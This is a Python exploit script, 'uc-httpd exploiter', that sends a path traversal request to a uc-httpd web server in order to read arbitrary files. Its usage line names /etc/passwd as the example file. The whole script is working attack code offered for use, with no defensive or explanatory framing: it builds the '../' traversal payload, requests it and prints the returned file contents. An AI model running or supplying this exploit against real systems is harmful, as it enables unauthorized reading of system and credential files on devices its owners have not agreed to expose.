#!usr/bin/env python
try:
    import urllib3
except:
    print("Install pip install urllib3")

import sys


class colors():
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(colors.OKGREEN + "[+] uc-httpd exploiter [+]")
print(colors.OKBLUE + "[+] usage: python3 " + __file__ + " http://targetip /etc/passwd")

if len(sys.argv) != 3:
    print("Type only URL")
    exit(1)

host = str(sys.argv[1])
file_to_read = str(sys.argv[2])
payload = host+'/../../../../..' +file_to_read

# urllib3 object
print('\n')
print(colors.BOLD +'[+]' + colors.OKGREEN + 'Trying: '  + payload)
http = urllib3.PoolManager()
r = http.request('GET', payload)

print("\n")
print(colors.ENDC + 'Status: ' + str(r.status))
print("\n")


if r.data != None:
    print(colors.ENDC+'[+]' + colors.OKGREEN + 'DATA RESPONSE: ' + colors.FAIL + str(r.data))
